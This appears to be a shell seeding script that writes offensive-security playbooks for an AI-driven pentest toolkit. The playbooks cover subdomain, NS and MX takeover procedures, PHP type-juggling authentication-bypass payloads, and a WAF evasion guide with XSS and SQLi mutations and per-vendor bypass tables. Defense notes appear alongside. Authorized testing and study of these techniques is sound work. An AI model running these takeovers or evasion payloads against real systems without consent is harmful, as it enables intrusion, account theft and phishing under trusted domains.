Subdomain takeover occurs when:

1. `sub.target.com` has a DNS record (CNAME, NS, A) pointing to an external service
2. The external resource is **no longer provisioned** (deleted S3 bucket, removed Heroku app, etc.)
3. The attacker can **register/claim** that exact resource name on the provider
4. The attacker now controls content served under `sub.target.com`

**Impact**: cookie theft (parent domain cookies), OAuth token interception, phishing under trusted domain, CSP bypass via whitelisted subdomain.  
（历史文案里的 CORS bypass：仅作危害链理解；**SRC 不单独挖/写 CORS**。）

---

## 2. DETECTION METHODOLOGY

### 2.1 CNAME Enumeration

```
1. Collect subdomains (amass, subfinder, assetfinder, crt.sh, SecurityTrails)
2. Resolve DNS for each:
   dig CNAME sub.target.com +short
3. For each CNAME → check if the CNAME target returns NXDOMAIN or a provider error
4. Match error response against fingerprint table (Section 3)
```

### 2.2 Key Signals

| Signal | Meaning |
|---|---|
| CNAME → `xxx.s3.amazonaws.com` + HTTP 404 "NoSuchBucket" | S3 bucket deleted, claimable |
| CNAME → `xxx.herokuapp.com` + "No such app" | Heroku app deleted |
| CNAME → `xxx.github.io` + 404 "There isn't a GitHub Pages site here" | GitHub Pages unclaimed |
| NXDOMAIN on the CNAME target domain itself | Target domain expired or never existed |
| CNAME → provider but HTTP 200 with default parking page | May or may not be claimable — verify |

### 2.3 Automated Tools

| Tool | Purpose |
|---|---|
| `subjack` | Automated CNAME takeover checking |
| `nuclei -t takeovers/` | Nuclei takeover detection templates |
| `can-i-take-over-xyz` (GitHub) | Reference for which services are vulnerable |
| `dnsreaper` | Multi-provider takeover scanner |
| `subzy` | Fast subdomain takeover verification |

---

## 3. SERVICE PROVIDER FINGERPRINT TABLE

| Provider | CNAME Pattern | Fingerprint (HTTP Response) | Claimable? |
|---|---|---|---|
| **AWS S3** | `*.s3.amazonaws.com` / `*.s3-website-*.amazonaws.com` | `NoSuchBucket` (404) | Yes — create bucket with matching name |
| **GitHub Pages** | `*.github.io` | `There isn't a GitHub Pages site here` (404) | Yes — create repo + enable Pages |
| **Heroku** | `*.herokuapp.com` / `*.herokudns.com` | `No such app` | Yes — create app with matching name |
| **Azure** | `*.azurewebsites.net` / `*.cloudapp.azure.com` / `*.trafficmanager.net` | Various default pages, NXDOMAIN | Yes — register matching resource |
| **Shopify** | `*.myshopify.com` | `Sorry, this shop is currently unavailable` | Yes — create shop, add custom domain |
| **Fastly** | CNAME to Fastly edge | `Fastly error: unknown domain` | Yes — add domain to Fastly service |
| **Pantheon** | `*.pantheonsite.io` | `404 Site Not Found` with Pantheon branding | Yes |
| **Tumblr** | `*.tumblr.com` (custom domain CNAME) | `There's nothing here` / `Whatever you were looking for doesn't exist` | Yes |
| **WordPress.com** | CNAME to `*.wordpress.com` | `Do you want to register` | Yes — claim domain in WP.com |
| **Zendesk** | `*.zendesk.com` | `Help Center Closed` / Zendesk branding on error | Yes — create matching subdomain |
| **Unbounce** | `*.unbouncepages.com` | `The requested URL was not found` | Yes |
| **Ghost** | `*.ghost.io` | `404 Not Found` Ghost error | Yes |
| **Surge.sh** | `*.surge.sh` | `project not found` | Yes |
| **Fly.io** | CNAME to `*.fly.dev` | Fly.io default 404 | Yes |

---

## 4. TAKEOVER PROCEDURE — COMMON PROVIDERS

### 4.1 AWS S3

```
1. Confirm: curl -s http://sub.target.com → "NoSuchBucket"
2. Extract bucket name from CNAME (e.g., sub.target.com.s3.amazonaws.com → bucket = "sub.target.com")
3. aws s3 mb s3://sub.target.com --region <region>
4. Upload index.html proving control
5. Enable static website hosting
```

### 4.2 GitHub Pages

```
1. Confirm: curl -s https://sub.target.com → "There isn't a GitHub Pages site here"
2. Create GitHub repo (any name)
3. Add CNAME file containing "sub.target.com"
4. Enable GitHub Pages in repo settings
5. Wait for DNS propagation (GitHub verifies CNAME match)
```

### 4.3 Heroku

```
1. Confirm: curl -s http://sub.target.com → "No such app"
2. heroku create <app-name-from-cname>
3. heroku domains:add sub.target.com
4. Deploy proof-of-concept page
```

---

## 5. NS TAKEOVER — HIGH SEVERITY

NS takeover is **far more dangerous** than CNAME takeover: you control **all DNS resolution** for the zone.

### How It Happens

```
target.com NS → ns1.expireddomain.com
                 ↓
attacker registers expireddomain.com
                 ↓
attacker now controls ALL DNS for target.com
(A records, MX records, TXT records — everything)
```

### Detection

```
1. Enumerate NS records: dig NS target.com +short
2. Check each NS domain: whois ns1.example.com → is the domain expired or available?
3. Also check: dig A ns1.example.com → NXDOMAIN/SERVFAIL?
4. Subdelegated zones: check NS for sub.target.com specifically
```

### Impact

- Full domain takeover (serve any content, intercept email, issue TLS certs via DNS-01)
- Issue DV certificates from any CA using DNS challenge
- Modify SPF/DKIM/DMARC → send authenticated email as target

---

## 6. MX TAKEOVER — EMAIL INTERCEPTION

When MX records point to deprovisioned mail services:

```
target.com MX → mail.deadservice.com (service discontinued)
```

If attacker can claim `mail.deadservice.com` or the mail tenant:
- Receive password reset emails
- Intercept sensitive communications
- Potentially reset accounts that use email-based auth

### Common Scenario

Expired Google Workspace / Microsoft 365 tenant → MX still points to Google/Microsoft → attacker creates new tenant and claims the domain.

---

## 7. WILDCARD DNS RISKS

If `*.target.com` has a wildcard CNAME to a claimable service:
- **Every** undefined subdomain is vulnerable
- `anything.target.com` can be taken over
- Massively increases attack surface

Detection: `dig A random1234567.target.com` — if it resolves, wildcard exists.

---

## 8. DETECTION & EXPLOITATION DECISION TREE

```
Subdomain discovered (sub.target.com)?
├── Resolve DNS records
│   ├── Has CNAME → external service?
│   │   ├── HTTP response matches known fingerprint? (Section 3)
│   │   │   ├── YES → Attempt claim on provider (Section 4)
│   │   │   │   ├── Claim successful → TAKEOVER CONFIRMED
│   │   │   │   └── Claim blocked (name reserved, region locked) → document, try variations
│   │   │   └── NO → Service active, no takeover
│   │   └── CNAME target NXDOMAIN?
│   │       ├── Target is a registrable domain? → Register it → full control
│   │       └── Target is a subdomain of active provider → check provider claim process
│   │
│   ├── Has NS records → external nameserver?
│   │   ├── NS domain expired/available? → Register → FULL ZONE TAKEOVER
│   │   └── NS domain active → no takeover
│   │
│   ├── Has MX → external mail service?
│   │   ├── Mail service deprovisioned/claimable? → Claim tenant → EMAIL INTERCEPTION
│   │   └── Active mail service → no takeover
│   │
│   └── Has A record → IP address?
│       ├── IP belongs to elastic cloud (AWS EIP, Azure, GCP)?
│       │   ├── IP unassigned? → Claim IP → serve content
│       │   └── IP assigned to another customer → no takeover
│       └── IP belongs to dedicated server → no takeover
│
└── Post-takeover impact assessment
    ├── Shared cookies with parent domain? → Session hijacking
    ├── （勿单独报 CORS）子域 XSS / 接管后的敏感读/写 → 写主业务洞
    ├── CSP whitelists *.target.com? → XSS via taken-over subdomain
    ├── OAuth redirect_uri allows sub.target.com? → Token theft
    └── Can issue TLS cert for sub.target.com? → Full MITM
```

---

## 9. DEFENSE & REMEDIATION

| Action | Priority |
|---|---|
| Remove DNS records when deprovisioning cloud resources | Critical |
| Monitor CNAME targets for NXDOMAIN responses | High |
| Use DNS monitoring tools (SecurityTrails, DNSHistory) | High |
| Claim/reserve resource names before deleting DNS records | High |
| Audit NS delegations — ensure NS domains are owned and renewed | Critical |
| Avoid wildcard CNAMEs to third-party services | Medium |
| Implement Certificate Transparency monitoring | Medium |

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **CNAME ≠ takeover**: A CNAME to S3 that returns 403 (bucket exists, private) is NOT vulnerable. Only `NoSuchBucket` (404) is.
2. **Region matters for S3**: Bucket names are global, but website endpoints are regional. Try matching the region from the CNAME.
3. **GitHub Pages verification**: GitHub added domain verification — org-verified domains cannot be claimed by others. Check if target uses this.
4. **Edge cases**: Some providers (e.g., Cloudfront) require specific distribution configuration, not just domain claiming.
5. **Second-order takeover**: `sub.target.com CNAME → other.target.com CNAME → dead-service.com` — the chain must be followed fully.
6. **SPF subdomain takeover**: If SPF includes `include:sub.target.com` and you take over `sub.target.com`, you can modify its SPF TXT record to authorize your mail server → send spoofed email as `target.com`.
TECH_SUBDOMAIN_TAKEOVER_TEST_EOF

seed_rule techniques/type-juggling-test.md <<'TECH_TYPE_JUGGLING_TEST_EOF'
# type-juggling

# PHP Type Juggling — Weak Comparison & Magic Hash Bypass

## 0. QUICK START

**First-pass goal**: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password.

### First-pass payloads (auth / token shape)

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

### Minimal PHP probes (local or `php -r` in lab)

```php
<?php
// Loose compare probes — run in target PHP major version if possible
var_dump('0e123' == '0e999');
var_dump('123a' == 123);
var_dump(md5('240610708') == md5('QNKCDZO'));
```

### Routing hints

| Clue | Next step |
|---|---|
| Source code uses `==` to compare passwords, tokens, or HMAC values | Go to Sections 1-3 |
| `md5($a) == md5($b)` or loose `sha1` comparison | Section 2 magic hashes |
| `hash_hmac(...) != '0'` or compared with `"0"` | Section 3 |
| `strcmp`、`json_decode(..., true)`、`intval` | Section 5 |

---

## 1. LOOSE COMPARISON (`==`) — TRUTH TABLE & VERSIONS

PHP compares operands with type juggling unless you use `===` or `hash_equals()` for secrets.

### 1.1 Core examples (strings vs numbers)

| Expression | Result | Mechanism (short) |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | Both strings look numeric → compared as **floats**; both parse to **1000.0** (not zero — common exam trap; see next row for real “both zero”) |
| `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` | **true** | Both parse as **0.0** in scientific notation |
| `'123a' == 123` | **true** | String cast to int stops at first non-digit → `123` |
| `'abc' == 0` | **true** (PHP **7.x and earlier**) | Non-numeric string compared to int → string becomes `0` |
| `'' == 0` | **true** | Empty string → `0` |
| `'' == false` | **true** | both “falsy” in loose rules |
| `false == NULL` | **true** | loose equality |
| `0 == false` | **true** | loose equality |
| `'' == 0 == false == NULL` | **true** (chain) | Each adjacent pair is **true** under `==` (`''==0`, `0==false`, `false==NULL`) — classic “falsy” chain |
| `'0' == false` | **true** | String `'0'` is the **only** non-empty string that compares as false to boolean |
| `'php' == 0` | **false** (PHP **8+**) | PHP 8: non-numeric string **no longer** equals `0` |

### 1.2 PHP 5 vs 7 vs 8 (high-signal deltas)

| Topic | PHP 5.x / 7.x (typical) | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** (string → 0) | **false** |
| String-to-number for `"123a"` | Still truncates for `(int)` / numeric compare in many `==` paths | Same idea for numeric strings; **non-numeric** vs int fixed as above |
| `md5([])` / `sha1([])` | May warn / `NULL`-like behavior in older patterns | **TypeError** for wrong types — kills classic `[]` tricks unless error handling collapses to NULL |

**Tester takeaway**: always note **PHP version** from headers, `X-Powered-By`, or fingerprint; a payload that works on PHP 7 may fail on PHP 8.

### 1.3 Safe alternative (defense / verification)

```php
hash_equals((string)$expected, (string)$actual);  // timing-safe, strict string
// or
$expected === $actual;
```

---

## 2. MAGIC HASHES (`0e…` + digits only)

When both sides are **hex-looking hash strings** that match `^0e[0-9]+$`, PHP treats them as **floats in scientific notation** → value **0.0**. Then `md5(A) == md5(B)` is **true** even though digests differ as strings.

### 2.1 Reference table (MD5 / SHA-1 and longer algos)

| Algorithm | Example input | Digest (starts with `0e` + all decimal digits) |
|---|---|---|
| **MD5** | `240610708` | `0e462097431906509019562988736854` |
| **MD5** | `QNKCDZO` | `0e830400451993494058024219903391` |
| **SHA-1** | `10932435112` | `0e07766915004133176347055865026311692244` |
| **SHA-224** | *(brute-force / precomputed)* | Example form: `0e` + decimal digits only → `==` with another such string is true |
| **SHA-256** | *(brute-force / precomputed)* | Same pattern: only strings matching `^0e\d+$` collide under `==` |

**Why it works**: `md5('240610708') == md5('QNKCDZO')` → both sides match `^0e[0-9]+$` → both interpreted as **0.0 == 0.0** → **true**.

### 2.2 Exploit pattern in code

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // intended: different strings, same md5 (impossible for md5)
    // actual: two different strings whose *digests* are magic hashes
}
```

### 2.3 Payload sketch (pair hunting)

```text
?a=240610708&b=QNKCDZO
```

For SHA-224/256, treat as **search problem**: brute-force inputs until digest matches `^0e\d+$`; pair two distinct inputs. Longer hashes = harder; MD5/SHA1 examples above are the usual teaching set.

---

## 3. HMAC BYPASS (LOOSE COMPARE VS `"0"` OR `0`)

If logic uses **loose** inequality against a constant:

```php
if (hash_hmac('md5', $data, $key) != '0') { /* ok */ }
// or == 0, == false with string "0e...", etc.
```

Brute-force **`$data`** (e.g. timestamp, nonce, counter) until `hash_hmac` output matches **`^0e[0-9]+$`** (for MD5 output) or the code’s specific loose rule — then the hash may compare equal to `0` or to another magic digest under `==`.

### Example (MD5-style `0e` digest for a numeric message)

| Concept | Example |
|---|---|
| Message type | Unix timestamp, incrementing id, millisecond clock |
| Timestamp brute-force pattern | Tutorials sometimes cite `1539805986` → `0e772967136366835494939987377058` as a **magic-hash style** example; **`md5('1539805986')` does not yield that digest** in stock PHP — use the idea (scan timestamps / counters until output matches `^0e[0-9]+$`) and **always verify against the exact function + key** in the target code. |
| Goal | Find `$data` such that `hash_hmac('md5', $data, $key)` matches `^0e[0-9]+$` |
| Note | Without knowing `$key`, you may still brute **`$data`** if algorithm/output are visible in a oracle; CTFs often leak or fix key |

```text
# Conceptual: try many timestamps
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**Mitigation**: `hash_equals($mac, $expected)` + fixed-length hex/binary encoding; never compare HMAC to bare `"0"`.

---

## 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)

Invalid types can yield **`NULL`** on the compared side; loose equality to another `NULL` or coerced value may pass.

| Call | Typical PHP 7/8 behavior |
|---|---|
| `md5([])` | PHP 8: **TypeError**; older: warnings / not reliable across versions |
| `sha1([])` | Same |
| **Idea** | If error handler or custom wrapper converts failures to **`NULL`**, then `NULL == NULL` or `NULL == sha1("x")` if other side is also NULL |

```php
// CTF / broken code mental model:
@sha1($_GET['x']) == @sha1($_GET['y']);  // if both error to NULL → true
```

**Real audits**: look for **`@`**, custom `try/catch` that sets hash to `null`, or user input passed where a string is required.

---

## 5. CTF PATTERNS

### 5.1 `strcmp` / `strcasecmp` with arrays

```php
strcmp([], "password");  // NULL in PHP 7/8 (invalid args)
// NULL == 0  → true in loose compare if code does:
if (strcmp($_GET['p'], $secret) == 0)
```

Payload:

```text
?p[]=1
```

### 5.2 `intval` bypass

```php
// Hex: base 0 lets PHP interpret 0x prefix (version-dependent; always verify)
intval("0x1A", 0);   // → 26

// Octal: leading 0 can be parsed as octal with base 0
intval("010", 0);  // → 8 (classic teaching example; confirm on target PHP)

// Scientific notation: intval() alone stops at 'e'; cast via float first
intval((float) "1e2"); // → 100
```

```text
?id=0x1A
?id=010
?id=1e2
```

### 5.3 `json_decode` + `true` for associative array auth

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "nonempty" often true — see PHP loose rules
```

### 5.4 `is_numeric` + loose compare

```php
is_numeric("0e12345");  // true
"0e12345" == 0;         // true (scientific notation → 0.0)
```

### 5.5 Deserialization + magic properties

Unserialize user input into objects whose `__toString` or properties feed into `md5($obj)` or loose compare — combine with **magic hash** strings on properties (CTF). Look for `unserialize($_…)` near `==` on hashes.

---

## 6. DECISION TREE

```text
                         +------------------+
                         | PHP loose compare|
                         | or hash == hash? |
                         +--------+---------+
                                  |
                    +-------------+-------------+
                    |                           |
             +------v------+             +------v------+
             | Uses === or |             | Uses == or   |
             | hash_equals |             | strcmp == 0  |
             +------+------+             +------+-------+
                    |                           |
               STOP (likely)              +-----v-----+
                                          | Operand   |
                                          | types?    |
                                          +-----+-----+
                           +--------------+---+--------------+
                           |              |                  |
                    +------v------+ +-----v-----+    +-------v--------+
                    | Both numeric| | One int & |    | Hash digests   |
                    | strings 0e… | | one string|    | both 0e\d+ ?   |
                    +------+------+ +-----+-----+    +-------+--------+
                           |              |                  |
                      MAGIC HASH    STRING/INT           MAGIC HASH
                      COLLISION     JUGGLING             (md5/sha1/…)
                           |              |                  |
                           +------+-------+------------------+
                                  |
                           +------v------+
                           | HMAC / MAC  |
                           | vs "0"      |
                           +------+------+
                                  |
                           brute $data
                           for 0e… digest
                                  |
                           +------v------+
                           | Arrays /    |
                           | json true / |
                           | strcmp([])  |
                           +-------------+
```

### Tool references

| Tool | Use |
|---|---|
| Local `php` CLI | Reproduce `==` behavior for target major version |
| Static code review | Grep `==`, `!=` on crypto outputs; find missing `hash_equals` |
| CTF frameworks | Payload generators for magic hashes and `0e` search |

---

**Safety & scope**: Use only on **authorized** targets (CTF, lab, written permission). This skill explains **language semantics** for defense and assessment — not a license to attack systems without consent.
TECH_TYPE_JUGGLING_TEST_EOF

seed_rule techniques/waf-bypass.md <<'TECH_WAF_BYPASS_EOF'
# waf-bypass

# WAF Bypass Techniques — Evasion Playbook


## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](http-smuggling-test.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   └── HTML entities (for XSS) → still blocked?
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See http-smuggling-test.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |


---


## 附件：WAF_PRODUCT_MATRIX

# WAF Product Bypass Matrix


## 1. Cloudflare WAF

### Detection

- `cf-ray` header, `Server: cloudflare`, block page references "Cloudflare"
- Cookie: `__cfduid`, `__cf_bm`

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Unicode normalization | Cloudflare normalizes Unicode differently than backend — `＜script＞` (fullwidth) may pass WAF but render as `<script>` |
| Chunked body | Split payloads across HTTP chunks; Cloudflare may not reassemble before inspection |
| Payload mutation (SQLi) | `/*!50000UniOn*/SeLeCt` — MySQL version comments bypass keyword matching |
| Payload mutation (XSS) | `<svg/onload=alert&#40;1&#41;>`, `<details open ontoggle=alert(1)>` |
| Origin direct access | Find origin IP via DNS history, Shodan `ssl.cert.subject.cn:target.com`, email headers |
| JSON body | Switch from form-urlencoded to JSON — different parser, weaker rules |
| Super-long parameter names | Parameter name >128 chars may cause Cloudflare to skip inspection |

### Cloudflare-Specific Notes

- Cloudflare has multiple WAF modes: "Managed Rules" (Cloudflare-authored) and "OWASP ModSecurity Core Rule Set". Each has different bypass surfaces.
- Cloudflare's free-tier WAF has significantly fewer rules than Business/Enterprise.
- Browser Integrity Check and Bot Management are separate from WAF — don't confuse them.

---

## 2. AWS WAF

### Detection

- `x-amzn-requestid` header, runs in front of ALB/CloudFront/API Gateway
- Block response often returns 403 with JSON body or custom error page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Regex complexity | AWS WAF regex rules have execution time limits — complex input can cause regex to timeout → request passes |
| Size limits | AWS WAF inspects first 8KB of body (16KB for CloudFront). Payload after this boundary is uninspected |
| Custom rule gaps | Default AWS Managed Rules miss many edge cases; custom rules often have logic errors |
| JSON depth | Deeply nested JSON objects may exceed parser depth limits |
| Base64 in parameters | AWS WAF doesn't auto-decode Base64 in parameter values (unless custom transform configured) |
| URI vs body rules | Rules may cover URI but not body, or vice versa — test both |

### AWS WAF-Specific Notes

- AWS WAF v2 (WAFV2) has `SizeConstraintStatement` — bodies over the size limit are either blocked or allowed, depending on config. If "allow on oversize", pad payload beyond 8KB.
- AWS Managed Rule Groups update regularly but lag behind novel attack patterns.
- IP reputation lists may be stale — new IPs from cloud providers often aren't listed.

---

## 3. ModSecurity + OWASP CRS

### Detection

- `Server: Apache` or `nginx` with ModSecurity module
- Block page: "ModSecurity" reference, or generic 403
- Error contains rule ID (e.g., `id:942100`)

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Paranoia Level (PL) gaps | PL1 (default) has minimal rules; PL2-4 progressively stricter. Most deployments run PL1-2, missing many attack patterns |
| Rule ID specific bypass | Each rule targets specific patterns — identify blocking rule ID from error, craft bypass for that specific regex |
| SQL comment injection | `/*! ... */` MySQL conditional comments bypass many CRS SQLi rules |
| Unicode in PL1 | PL1 doesn't check Unicode-encoded payloads: `%u0027` for `'` |
| Transformation order | CRS applies `t:urlDecodeUni,t:htmlEntityDecode` but not all transformations on all rules |
| Multipart parser | CRS multipart parsing can be confused by malformed boundaries |
| Request body limit | `SecRequestBodyLimit` default is 13MB — but `SecRequestBodyNoFilesLimit` is only 128KB (changeable). Payloads in file upload fields bypass body rules if only `NoFiles` limit is enforced |

### CRS-Specific Notes

- CRS v4 (2023+) significantly improved coverage vs v3. Check target's CRS version.
- Anomaly scoring mode: individual rule violations add to score, blocked only if total exceeds threshold. Keep individual violations below detection but accumulate effect.
- `SecRuleRemoveById` directives in config may disable specific rules — test for holes.

---

## 4. Akamai (Kona Site Defender / App & API Protector)

### Detection

- `Server: AkamaiGHost`, `x-akamai-*` headers
- Error reference number in block page

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Header injection | Akamai processes certain headers differently; `X-Forwarded-Host` injection can confuse routing |
| Encoding chains | Triple encoding or mixed encoding (URL + Unicode + HTML) |
| JSON body bypass | Akamai's JSON parser may not inspect deeply nested objects |
| Slow POST | Akamai has timeout-based protections; slow delivery may cause incomplete inspection |
| HTTP/2 push | H2 server push responses may bypass WAF inspection |
| IP rotation | Akamai rate limits per IP; rotating source IPs avoids behavioral blocks |

### Akamai-Specific Notes

- Akamai has "Adaptive Security Engine" — it learns application behavior. New attack patterns that don't match learned behavior may bypass initially.
- Penalty box: after triggering Akamai WAF, your IP may be rate-limited for minutes. Use fresh IP for each test.
- Akamai Pragma headers (`Pragma: akamai-x-check-cacheable`) can leak internal routing information useful for understanding the setup.

---

## 5. Imperva / Incapsula

### Detection

- `X-CDN: Imperva`, `Set-Cookie: incap_ses_*`, `visid_incap_*`
- Block page: "Powered by Incapsula" or Imperva branding

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Parameter pollution | Duplicate parameters: Imperva inspects one occurrence, app processes another |
| JSON deep nesting | `{"a":{"b":{"c":{"d":"payload"}}}}` — deeply nested JSON exceeds parser depth |
| Multipart abuse | Malformed multipart boundaries confuse Imperva's parser |
